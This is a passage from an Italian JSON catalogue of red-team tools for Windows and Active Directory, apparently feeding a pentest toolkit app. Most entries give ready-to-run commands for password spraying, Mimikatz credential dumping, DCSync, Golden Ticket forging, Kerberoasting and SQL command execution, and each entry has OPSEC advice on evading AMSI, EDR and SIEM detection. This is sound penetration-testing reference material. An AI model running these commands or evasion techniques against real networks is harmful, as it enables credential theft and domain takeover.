ascolto in background e pulire le risorse di rete.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Lateral Movement</strong> su host dove non si vuole lasciare artefatti binari. Se si compromette una workstation con restrizioni sull'esecuzione di EXE ma con PowerShell abilitato, Inveigh.ps1 permette di trasformare l'host in un punto di ascolto per catturare credenziali di altri utenti (es. admin di dominio) che navigano nella stessa subnet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto vulnerabile a <strong>AMSI</strong> (Antimalware Scan Interface) e <strong>Script Block Logging</strong>. La maggior parte degli EDR moderni bloccherà l'esecuzione dello script se non offuscato pesantemente.</p><p><strong>Impatto operativo:</strong> L'esecuzione prolungata in PowerShell può consumare risorse. Stessi rischi di rete della versione EXE.</p><p><strong>Mitigazioni:</strong> Usare offuscatori (es. Invoke-Obfuscation) prima del caricamento. Preferire la versione C# se si dispone di un metodo per eseguire binari, usare PS1 solo come fallback.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-win",
    "name": "kerbrute_Windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool in Go per enumerazione utenti e password spraying veloce e stealth sfruttando la pre-autenticazione Kerberos (porta 88).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos per enumerare utenti validi e testare password, offrendo un'alternativa molto più rapida e furtiva rispetto ai metodi tradizionali basati su SMB o LDAP. Poiché interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, evita di generare i rumorosi log di \"Logon Failure\" (Event ID 4625) tipici dei tentativi NTLM, rendendo l'attività molto più difficile da rilevare per i difensori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> Sfrutta il fatto che il KDC restituisce codici di errore diversi se un utente esiste (<code>KDC_ERR_PREAUTH_REQUIRED</code>) o meno (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>). Questo permette di validare liste di username enormi in pochi secondi senza inviare alcuna password.</p><p><strong>Password Spraying:</strong> Esegue tentativi di login massivi provando una password contro molti utenti. Se il login ha successo, ottiene un TGT; se fallisce, genera un errore Kerberos. Questo metodo è più veloce del protocollo SMB e non rischia di bloccare l'account se usato correttamente (una sola password).</p><p><strong>Nessun requisito di dominio:</strong> Può essere eseguito da una macchina fuori dominio (es. laptop dell'attaccante in VPN), purché abbia visibilità di rete verso il Domain Controller, rendendolo perfetto per le fasi iniziali di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il binario standalone non richiede installazione. È fondamentale puntare al Domain Controller corretto.</p><pre><code># Enumerazione utenti validi da una wordlist\nkerbrute_windows.exe userenum -d domain.local --dc 192.168.1.10 users_list.txt\n\n# Password Spraying (Check password 'Welcome1')\nkerbrute_windows.exe passwordspray -d domain.local users.txt \"Welcome1\"\n\n# Verifica singola credenziale (Brute force - sconsigliato massivamente)\nkerbrute_windows.exe bruteuser -d domain.local passwords.txt username</code></pre><p>L'output evidenzia in verde le credenziali valide trovate, che possono essere usate immediatamente per accessi VPN, OWA o SMB.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, Kerbrute è lo standard per ripulire liste di utenti generate tramite OSINT (es. LinkedIn) e ottenere un elenco di target validi. Nel <strong>Password Spraying</strong>, è preferito per la sua velocità e per la minore impronta nei log di sicurezza standard di Windows, aggirando regole SIEM basate solo su eventi 4625.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene non generi 4625, genera eventi 4771 (Kerberos Pre-Auth Failed). Un volume anomalo di 4771 da un singolo IP è un IoC chiaro per Defender for Identity e SOC avanzati.</p><p><strong>Impatto operativo:</strong> Basso rischio di lockout se usato in modalità spray (1 password). Attenzione alla modalità brute-force che bloccherà account.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>--safe</code> (se disponibile nella build) o introdurre delay manuali. Non eseguire da un IP che non si vuole bruciare. Alternare i DC target se presenti multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/gentilkiwi/mimikatz",
    "desc": "Il framework definitivo per credential dumping, manipolazione ticket Kerberos e attacchi avanzati ad Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mimikatz è lo strumento che ha rivoluzionato la sicurezza di Windows, dimostrando le debolezze strutturali nella gestione delle credenziali in memoria. Consente agli attaccanti di estrarre password in chiaro, hash NTLM, ticket Kerberos e certificati direttamente dal processo LSASS (Local Security Authority Subsystem Service). Oltre al dumping, è una piattaforma completa per generare token di accesso falsi (Golden/Silver Tickets) e manipolare il funzionamento della crittografia di dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Dumping (Sekurlsa):</strong> Il modulo più noto, capace di leggere la memoria di LSASS per recuperare le credenziali di tutti gli utenti loggati (incluso WDigest, SSP, MSV1_0). Se configurato, può recuperare password in chiaro anche su versioni recenti di Windows.</p><p><strong>Kerberos Manipulation:</strong> Permette di eseguire attacchi Pass-the-Ticket (PTT), Pass-the-Key (PTK) e di creare ticket contraffatti come il Golden Ticket (TGT valido per 10 anni con diritti di Domain Admin) e Silver Ticket (accesso a servizi specifici), garantendo persistenza a lungo termine.</p><p><strong>DCSync:</strong> Simula il comportamento di un Domain Controller per richiedere la replicazione dei dati degli utenti (inclusi gli hash delle password) via protocollo MS-DRSR, permettendo di ottenere credenziali di tutti gli utenti del dominio senza eseguire codice sul DC reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mimikatz dispone di una console interattiva. Richiede privilegi di Debug (spesso ottenuti come Admin/SYSTEM).</p><pre><code># Avvio e acquisizione privilegi debug\nmimikatz # privilege::debug\n\n# Dump password e hash da LSASS\nmimikatz # sekurlsa::logonpasswords\n\n# Esecuzione DCSync (da utente con diritti di replica, es. Domain Admin)\nmimikatz # lsadump::dcsync /domain:lab.local /user:Administrator\n\n# Creazione Golden Ticket\nmimikatz # kerberos::golden /user:FakeAdmin /domain:lab.local /sid:S-1-5... /krbtgt:hash... /id:500 /ptt</code></pre><p>Può essere eseguito anche \"oneliners\" passando i comandi come argomenti all'eseguibile: <code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong> e <strong>Lateral Movement</strong>, è lo strumento primario per trasformare un accesso locale in un compromesso di dominio (tramite credential theft). Per la <strong>Persistence</strong>, i Golden Ticket e Skeleton Key offrono backdoor resilienti. I Blue Team lo utilizzano per verificare l'efficacia delle protezioni come Credential Guard e Protected Users Group.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Mimikatz è la \"firma\" più cercata al mondo. I binari su disco sono bloccati da qualsiasi AV. L'accesso alla memoria di LSASS genera eventi Sysmon (ID 10) e alert EDR critici. DCSync genera eventi di accesso agli oggetti AD (4662).</p><p><strong>Impatto operativo:</strong> Manipolare LSASS può causare Blue Screen of Death (BSOD) se non eseguito con cautela o versioni compatibili. Usare con estrema attenzione su server di produzione.</p><p><strong>Mitigazioni:</strong> Mai usare il binario standard. Eseguire via PowerShell in memoria (Invoke-Mimikatz) con offuscamento pesante, o meglio, usare tecniche di dumping alternative (es. ProcDump, Comsvcs) e analizzare il dump offline con Mimikatz sulla propria macchina.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "pingcastle",
    "name": "PingCastle",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.pingcastle.com/download/",
    "desc": "Scanner di sicurezza per Active Directory che genera report dettagliati su rischi, health check e mappa delle relazioni di trust.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PingCastle è uno strumento di audit progettato per valutare rapidamente il livello di sicurezza di un ambiente Active Directory. Basato su un modello di maturità (CMMI), analizza le configurazioni del dominio e genera un report HTML intuitivo che evidenzia i rischi, assegnando un punteggio di pericolo. È ampiamente utilizzato per identificare vulnerabilità strutturali, relazioni di trust dimenticate e account obsoleti che potrebbero essere sfruttati dagli attaccanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Health Check & Risk Scoring:</strong> Esegue centinaia di controlli di sicurezza (es. LAPS mancante, SMBv1 attivo, amministratori in gruppi a rischio) e calcola un punteggio di rischio aggregato, permettendo di prioritizzare le azioni correttive.</p><p><strong>Mappatura Trust & Forest:</strong> Visualizza graficamente le relazioni di trust tra domini e foreste, evidenziando trust bidirezionali pericolosi verso ambienti meno sicuri o di test.</p><p><strong>Stale Object Analysis:</strong> Identifica utenti e computer inattivi (\"stale\"), che rappresentano una superficie d'attacco inutile e dovrebbero essere disabilitati o rimossi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PingCastle è un eseguibile standalone che può essere lanciato con un account utente standard di dominio (l'accesso in lettura è sufficiente per quasi tutti i check).</p><pre><code># Modalità interattiva (menu guidato)\nPingCastle.exe\n\n# Healthcheck automatico sul dominio corrente\nPingCastle.exe --healthcheck --server domain.local\n\n# Scansione di domini in trust\nPingCastle.exe --scanner trust</code></pre><p>Al termine, genera un report HTML nella cartella di esecuzione, navigabile via browser, con spiegazioni dettagliate per ogni finding e raccomandazioni per la remediation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato regolarmente dai <strong>System Administrator</strong> per mantenere l'igiene dell'AD e prepararsi agli audit. Per i <strong>Penetration Tester</strong>, è eccellente nelle fasi iniziali per ottenere una visione d'insieme delle debolezze strutturali del cliente (es. \"Quick Wins\") senza generare traffico di attacco, guidando le fasi successive verso i punti più deboli dell'infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume sostenuto di traffico LDAP e query verso il DC. Sebbene sia traffico legittimo di lettura, l'intensità può essere notata.</p><p><strong>Impatto operativo:</strong> Basso. L'operazione è di sola lettura.</p><p><strong>Mitigazioni:</strong> Proteggere i report generati poiché contengono la mappa completa delle vulnerabilità dell'azienda.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "powerupsql",
    "name": "PowerUpSQL",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NetSPI/PowerUpSQL",
    "desc": "Toolkit PowerShell per discovery, audit e privilege escalation su istanze SQL Server enterprise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerUpSQL è un framework offensivo dedicato all'attacco delle infrastrutture Microsoft SQL Server. Permette di scoprire istanze SQL sparse nella rete, verificare configurazioni deboli (come password di default o account sa vuoti) ed eseguire escalation dei privilegi. È particolarmente potente nello sfruttare le catene di \"Linked Servers\" per muoversi lateralmente tra database e ottenere esecuzione di codice sul sistema operativo sottostante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Massiva:</strong> Trova server SQL tramite query SPN, broadcast UDP e scansioni mirate, mappando rapidamente la superficie d'attacco database dell'azienda.</p><p><strong>Linked Server Crawling:</strong> La feature più temibile: segue automaticamente i link tra database server per trovare percorsi che portano a server critici o dove l'utente ha privilegi elevati (spesso sysadmin), permettendo di saltare da un DB di test a uno di produzione.</p><p><strong>Command Execution:</strong> Automatizza l'abilitazione e l'uso di procedure come <code>xp_cmdshell</code>, <code>Ole Automation Procedures</code> o assembly CLR malevoli per passare dall'accesso SQL all'esecuzione di comandi shell come SYSTEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo PowerShell.</p><pre><code># Discovery istanze nel dominio\nGet-SQLInstanceDomain\n\n# Audit rapido delle configurazioni di default\nGet-SQLInstanceDomain | Invoke-SQLAudit\n\n# Crawling automatico dei link per trovare privilegi sysadmin\nGet-SQLInstanceDomain | Get-SQLServerLinkCrawl -Verbose\n\n# Esecuzione comandi OS su istanza vulnerabile\nInvoke-SQLOSCmd -Instance \"SQLSRV01\" -Command \"whoami\" -Verbose</code></pre><p>Il comando <code>Invoke-SQLAudit</code> genera un report CSV con le vulnerabilità identificate per ogni istanza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Network Pentest</strong>, i database SQL sono spesso il \"ventre molle\": patchati raramente e configurati con account di servizio privilegiati. PowerUpSQL permette di sfruttare un accesso database limitato per ottenere il controllo completo del server e usarlo come pivot. In <strong>Data Exfiltration</strong>, facilita l'individuazione e l'estrazione di dati sensibili da tabelle critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'abilitazione di <code>xp_cmdshell</code> è un evento ad alta criticità monitorato dai SIEM. Scansioni di discovery e login falliti generano log applicativi SQL.</p><p><strong>Impatto operativo:</strong> L'esecuzione di comandi o query pesanti può degradare le performance del DB. Modificare configurazioni globali può impattare le applicazioni.</p><p><strong>Mitigazioni:</strong> Ripristinare sempre le configurazioni (es. disabilitare xp_cmdshell) dopo l'uso. Limitare il crawling a target specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "powerview-ps1",
    "name": "PowerView.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PowerShellMafia/PowerSploit",
    "desc": "Script PowerShell di PowerSploit per ricognizione Active Directory pura: enumera utenti, gruppi, trust e sessioni senza dipendenze esterne.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerView è uno degli strumenti di enumerazione offensiva più iconici per ambienti Active Directory. Scritto interamente in PowerShell, non utilizza moduli RSAT amministrativi ma interagisce direttamente con le API Win32 e LDAP per mappare il dominio. È progettato per ottenere \"Situational Awareness\" completa: capire chi sono gli admin, dove sono loggati e quali relazioni di trust esistono, il tutto vivendo \"off-the-land\" senza introdurre binari compilati sospetti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User & Group Hunting:</strong> Funzioni come <code>Invoke-UserHunter</code> e <code>Find-LocalAdminAccess</code> sono vitali per il movimento laterale. Scansionano la rete per individuare su quali macchine sono attive sessioni di utenti privilegiati o dove l'utente corrente ha diritti di amministratore locale.</p><p><strong>Enumerazione ACL & GPO:</strong> Permette di analizzare le Access Control List (<code>Get-DomainObjectAcl</code>) per trovare \"strade nascoste\" di escalation (es. un utente che può resettare la password di un admin) e di leggere le Group Policy per identificare policy di sicurezza deboli o script di avvio modificabili.</p><p><strong>Mappatura Trust:</strong> Con <code>Get-DomainTrust</code> e <code>Get-ForestTrust</code>, visualizza le relazioni logiche tra domini, essenziale per pianificare attacchi che attraversano i confini della foresta AD (es. da un dominio child compromesso al root parent).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo in memoria (spesso bypassando AMSI prima).</p><pre><code># Caricamento e info base dominio\nImport-Module .\\PowerView.ps1\nGet-Domain\n\n# Trovare dove sono loggati i Domain Admin\nInvoke-UserHunter -GroupName \"Domain Admins\" -Stealth\n\n# Enumerare share di rete leggibili in tutto il dominio\nInvoke-ShareFinder -CheckShareAccess -Verbose</code></pre><p>Molte funzioni accettano filtri LDAP raw per query di precisione chirurgica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, è lo strumento primario per rispondere alla domanda \"Dove vado ora?\". Se si compromette un utente, PowerView rivela immediatamente se quell'utente ha accesso speciale (es. RDP su un server critico) o se appartiene a gruppi annidati interessanti. In fase di <strong>Privilege Escalation</strong>, l'analisi delle ACL spesso rivela la via più silenziosa per diventare Domain Admin senza usare exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PowerView è pesantemente firmato dai vendor antivirus. L'esecuzione su disco è quasi sempre bloccata. AMSI intercetta le funzioni caricate in memoria. Le scansioni di rete (es. UserHunter) generano traffico SMB/RPC verso molti host.</p><p><strong>Mitigazioni:</strong> Utilizzare versioni offuscate o eseguire via C2 che supportano l'esecuzione in memoria (come Cobalt Strike <code>powershell-import</code>). Preferire query LDAP mirate (<code>Get-DomainUser</code>) rispetto a scansioni attive (<code>Invoke-UserHunter</code>) se il monitoraggio è alto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "responder-windows",
    "name": "Responder-Windows",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/Responder-Windows",
    "desc": "Versione Windows (spesso Python script) di Responder per LLMNR/NBT-NS poisoning e cattura hash NTLM in reti locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene Responder sia nativo Linux, questa variante permette l'esecuzione su macchine Windows (spesso usando l'interprete Python installato). Esegue lo stesso compito critico: ascoltare richieste broadcast di risoluzione nomi (LLMNR/NBT-NS) e rispondere falsamente per dirottare il traffico verso l'attaccante, catturando hash NTLMv2 degli utenti vittima.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Poisoning:</strong> Risponde a query per nomi host errati, fingendo di essere il server destinazione.</p><p><strong>Auth Capture:</strong> Simula server SMB/HTTP/SQL per forzare i client a inviare le credenziali di autenticazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python su Windows.</p><pre><code># Avvio standard su interfaccia specifica\npython Responder.py -I \"Ethernet0\" -wrf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest (Windows-only):</strong> Se si ha accesso a una VM Windows nella rete target ma non si può introdurre una macchina Linux/Kali, questa versione permette di eseguire comunque attacchi MITM per catturare credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. I moderni Defender rilevano l'ascolto su porte NetBIOS/LLMNR e le risposte rapide.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "rpcdump-windows",
    "name": "rpcdump_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/csandker/RPCDump",
    "desc": "Utility per enumerare endpoint RPC (porta 135), mappare interfacce UUID e identificare servizi nascosti o vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RPCDump è uno strumento diagnostico essenziale per la fase di ricognizione interna. Interroga il servizio RPC Endpoint Mapper (sulla porta TCP 135) di un host remoto per ottenere l'elenco completo delle interfacce RPC registrate, i loro UUID, i protocolli di binding e le annotazioni. Questa visibilità permette di identificare servizi non standard, versioni di software specifiche e potenziali target vulnerabili (es. vecchie interfacce vulnerabili a MS08-067 o PrintNightmare) che non apparirebbero in una normale scansione di porte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Endpoint:</strong> Estrae la lista degli endpoint dinamici e statici, rivelando quali porte effimere sono in ascolto per servizi specifici (es. DHCP, DNS management, servizi proprietari).</p><p><strong>Analisi UUID:</strong> Permette di correlare gli UUID universali trovati con servizi noti. Ad esempio, la presenza di UUID specifici può indicare l'installazione di software di backup o di gestione remota vulnerabile.</p><p><strong>Service Discovery:</strong> Identifica servizi che non rispondono alle scansioni SYN standard ma sono raggiungibili tramite Named Pipes o RPC over HTTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool è una semplice utility a riga di comando che richiede l'IP del target.</p><pre><code># Enumerazione base verso un target remoto\nrpcdump.exe -p 192.168.1.10\n\n# Enumerazione verbose con dettagli sui binding\nrpcdump.exe -v -p 192.168.1.10</code></pre><p>L'output elencherà ogni interfaccia con il formato <code>UUID vMajor.Minor (Annotation) [Binding]</code>. Analizzare le annotazioni per identificare rapidamente software interessanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In una fase di <strong>Discovery approfondita</strong>, RPCDump aiuta a mappare la superficie d'attacco reale di un server Windows, rivelando servizi che potrebbero essere firewallati sulle porte standard ma esposti via RPC. È utile anche per confermare la presenza di patch: se un'interfaccia vulnerabile nota non è più listata o ha cambiato versione, è probabile che il sistema sia stato aggiornato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La connessione alla porta 135 e l'interrogazione dell'Endpoint Mapper sono traffico legittimo ma, se eseguite in sequenza su molti host, costituiscono un chiaro pattern di ricognizione.</p><p><strong>Impatto operativo:</strong> Nullo, è una query informativa standard.</p><p><strong>Mitigazioni:</strong> Eseguire scansioni mirate piuttosto che sweeping sull'intera subnet.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "rubeus",
    "name": "Rubeus.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/GhostPack/Rubeus",
    "desc": "Il coltellino svizzero C# per Kerberos abuse: TGT requests, roasting, ticket extraction, pass-the-ticket e monitoraggio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Rubeus è lo standard de facto per la manipolazione di Kerberos in ambienti Windows. Scritto in C# per integrarsi con framework .NET e Cobalt Strike, permette di eseguire quasi ogni attacco noto contro Kerberos: dalla richiesta di ticket (AS-REQ) all'iniezione in memoria (Pass-the-Ticket), fino al roasting (Kerberoast/ASREPRoast) e all'intercettazione di ticket al volo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Roasting & Harvesting:</strong> Esegue Kerberoasting e AS-REP Roasting in modo stealth, estraendo hash crackabili.</p><p><strong>Ticket Management:</strong> Può estrarre ticket (TGT/TGS) da sessioni di altri utenti (dump), iniettarli nella sessione corrente (ptt) o rinnovarli.</p><p><strong>Advanced Attacks:</strong> Supporta S4U (Constrained Delegation abuse), Diamond Ticket, Sapphire Ticket e manipolazione di ticket per Golden/Silver ticket attacks.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da riga di comando o via execute-assembly.</p><pre><code># Kerberoasting stealth con output su file\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Pass-the-Ticket (iniezione file kirbi)\nRubeus.exe ptt /ticket:administrator.kirbi\n\n# Monitoraggio nuovi ticket (harvesting)\nRubeus.exe monitor /interval:10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Lateral Movement & Persistence:</strong> Tool onnipresente in ogni fase. Dopo l'accesso iniziale, si usa per l'escalation (Roasting). Dopo aver ottenuto admin, si usa per persistenza (Golden Ticket) o movimento laterale (Overpass-the-hash).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rubeus è pesantemente firmato. L'uso in memoria è soggetto a scan AMSI e comportamentale. Tecniche come <code>monitor</code> o iniezioni ticket massicce sono rumorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "securityassessment-ps1",
    "name": "SecurityAssessment.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script PowerShell per audit automatico della postura di sicurezza Windows/AD, verifica hardening e compliance a best practices.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SecurityAssessment.ps1 è uno script di audit progettato per valutare rapidamente il livello di hardening di workstation e server Windows. A differenza dei tool offensivi, il suo scopo è difensivo o di \"situational awareness\": analizza centinaia di impostazioni di configurazione (GPO, Registry, Audit Policy, Patch level) e le confronta con le best practice di sicurezza (es. CIS Benchmarks, Microsoft Security Baselines), generando un report dettagliato sulle lacune identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Configurazione Sistema:</strong> Verifica lo stato di UAC, AppLocker, BitLocker, Credential Guard e servizi vulnerabili attivi. Controlla le impostazioni di SMB (v1 disabilitato, signing richiesto) e protocolli di rete obsoleti (LLMNR/NBT-NS).</p><p><strong>Audit Policy & Logging:</strong> Analizza se il sistema sta registrando gli eventi critici necessari per la rilevazione di attacchi (es. Command Line Auditing, PowerShell Script Block Logging, Logon Events).</p><p><strong>Account & Privilegi:</strong> Identifica account locali inattivi, membri del gruppo Administrators locale e configurazioni dei diritti utente (User Rights Assignment) che deviano dai valori sicuri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script da una shell amministrativa. Non richiede installazione.</p><pre><code># Esecuzione standard con generazione report\nPS C:\\> .\\SecurityAssessment.ps1\n\n# Esecuzione con output in cartella specifica\nPS C:\\> .\\SecurityAssessment.ps1 -OutputPath C:\\Audit\\Reports</code></pre><p>Al termine, esaminare il file HTML o CSV generato per prioritizzare le remediation in base alla gravità dei riscontri (Rosso/Giallo/Verde).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Usato dai <strong>Blue Team</strong> per verificare la conformità delle \"Golden Image\" prima del deployment. Per i <strong>Penetration Tester</strong>, se si ha accesso fisico o RDP a una macchina, fornisce una lista immediata di vettori di Privilege Escalation locale (es. servizi con path non quotati, AlwaysInstallElevated) e difese mancanti (es. no AV, no EDR).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo script esegue letture massive del registro e WMI. Su sistemi con EDR avanzati, questo comportamento (simile a tool di enumeration offensivi come Seatbelt) potrebbe generare alert.</p><p><strong>Impatto operativo:</strong> Basso, attività di sola lettura.</p><p><strong>Mitigazioni:</strong> Se in contesto Red Team, leggere il codice e lanciare solo funzioni specifiche manualmente invece dell'intero script.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharphound",
    "name": "SharpHound.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SpecterOps/SharpHound",
    "desc": "Collector C# per BloodHound: mappa relazioni AD, ACL, sessioni utente e trust per identificare attack path complessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpHound è il componente di raccolta dati (Ingestor) per BloodHound. Scritto in C#, è progettato per interrogare massivamente l'Active Directory ed estrarre le relazioni logiche tra utenti, gruppi, computer e container. I dati raccolti (formattati in JSON) vengono poi importati nel database Neo4j di BloodHound per visualizzare graficamente i percorsi di attacco che permettono di scalare privilegi o muoversi lateralmente nel dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Strutturale:</strong> Scarica l'intera struttura del dominio (OU, gruppi, utenti), le relazioni di trust tra domini/foreste e le Group Policy. Utilizza LDAP per query efficienti e minimizzando il traffico.</p><p><strong>Analisi ACL & Sessioni:</strong> La vera potenza risiede nell'enumerare le Access Control List (chi può resettare la password di chi?) e le sessioni attive (dove è loggato l'Admin?). Per le sessioni, interroga i singoli host via RPC/NetBIOS (\"Session Loop\").</p><p><strong>Stealth & Optimization:</strong> Include opzioni per randomizzare i delay, escludere Domain Controller, criptare gli output e usare metodi di raccolta meno invasivi (es. solo DCOnly) per ridurre la visibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da una macchina joinata al dominio con un utente qualsiasi. L'opzione <code>-c All</code> è la più comune ma rumorosa.</p><pre><code># Raccolta completa standard\nSharpHound.exe -c All\n\n# Raccolta stealth (solo dati AD, niente connessioni agli host)\nSharpHound.exe -c DCOnly --randomizefilenames --encryptzip\n\n# Loop continuo per mappare sessioni (ogni 30 min per 2 ore)\nSharpHound.exe -c SessionLoop --loopduration 02:00:00 --loopinterval 00:30:00</code></pre><p>Caricare il file <code>.zip</code> generato nell'interfaccia grafica di BloodHound.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È lo standard industriale per mappare il rischio di <strong>Lateral Movement</strong>. Fondamentale per rispondere a domande come: \"Da questa workstation compromessa, posso arrivare al Domain Admin?\". Utile anche ai difensori per identificare e rimuovere \"Dangerous Rights\" assegnati per errore a gruppi generici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione delle sessioni (metodo <code>All</code> o <code>Session</code>) tocca ogni host della rete, generando un \"port scan\" distribuito sulla porta 445 molto rumoroso. Defender for Identity rileva l'enum LDAP massiva.</p><p><strong>Mitigazioni:</strong> Usare <code>-c DCOnly</code> per restare quasi invisibili (solo traffico LDAP verso il DC). Evitare <code>SessionLoop</code> in ambienti monitorati. Eseguire da un IP in whitelist se possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharpmapexec",
    "name": "SharpMapExec.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/cube0x0/SharpMapExec",
    "desc": "Porting C# di CrackMapExec per post-exploitation: esegue spraying, check credenziali e comandi WMI/SMB/WinRM nativamente.",
